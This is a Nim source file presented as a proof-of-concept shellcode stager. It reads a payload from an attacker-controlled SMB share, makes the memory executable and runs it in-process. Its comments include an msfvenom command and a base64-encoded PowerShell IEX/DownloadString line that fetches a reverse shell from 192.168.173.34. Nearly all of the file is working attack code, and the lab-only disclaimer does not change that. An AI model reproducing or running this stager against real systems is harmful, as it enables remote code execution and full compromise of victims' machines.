
#[
    Author: Sam Sepiol, Twitter: @5epi0l

    Description: This is a POC for a stager written in nim that fetches the shellcode from an attacker controlled SMB Server ,  injects the
    shellcode into the memory space of the current process and execute it. Here, I've used msfvenom to create a shellcode which will execute 
    powershell on the target machine to fetch a powershell reverse shell from an attacker controlled HTTP server and execute it in memory 
    using Invoke-Expression. 
    
    Disclaimer:  This POC has been developed for development and testing purposes only. No attempts of AV/EDR evasion have been made .
    Run it within your own controlled lab-environment.
         
]#


import winim/lean


#[msfvenom -p windows/x64/exec CMD="powershell.exe -w hidden -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADQANgAuADMANAAvAHAAdwBuAC4AcABzADEAIgApAA==" -f raw -o shellcode.bin]#
#[IEX(New-Object Net.Webclient).DownloadString('http://192.168.173.34/shell.ps1') <-- This is the base64 encoded payload]#

var payload = "\\\\192.168.173.34\\smb\\shellcode.bin"  #[Connecting to the attacker's SMB Server to fetch the shellcode]#
var file: File  = open(payload, fmRead) 


var fsize = file.getFileSize()
var shellcode = newSeq[byte](fsize)
discard file.readBytes(shellcode, 0, fsize)

let memAddr = VirtualAlloc(
    nil,
    len(shellcode),
    MEM_COMMIT,
    PAGE_READWRITE
    )
copyMem(
    memAddr,
    shellcode[0].addr, 
    len(shellcode)
    )

var PrevPro: DWORD = 0
let virPro = VirtualProtect(
    memAddr, 
    cast[SIZE_T](len(shellcode)), 
    PAGE_EXECUTE_READ, 
    addr PrevPro
    )


let f = cast[proc(){.nimcall.}](memAddr)
f()



  




